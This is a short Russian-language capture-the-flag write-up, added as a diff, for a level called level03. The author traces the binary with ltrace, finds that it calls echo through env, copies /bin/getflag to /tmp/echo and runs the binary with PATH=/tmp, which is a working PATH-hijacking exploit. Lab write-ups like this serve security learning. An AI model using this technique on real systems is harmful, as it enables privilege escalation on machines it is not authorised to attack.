@@ -1,0 +1,15 @@
+После запуска файла level03 становится очевидным что надо в нем что то заабузить
+
+С помощью ltrace смотрим, что вызывает программа
+  ltrace ./level03
+
+system("/usr/bin/env echo Exploit me"Exploit me
+
+Находим где лежит getflag
+which getflag -> /bin/getflag
+
+копируем getflag с именем echo в tmp папку
+cp /bin/getflag /tmp/echo
+
+Юзаем level03 прокидывая туда PATH на нашу tmp папку
+PATH=/tmp ./level03
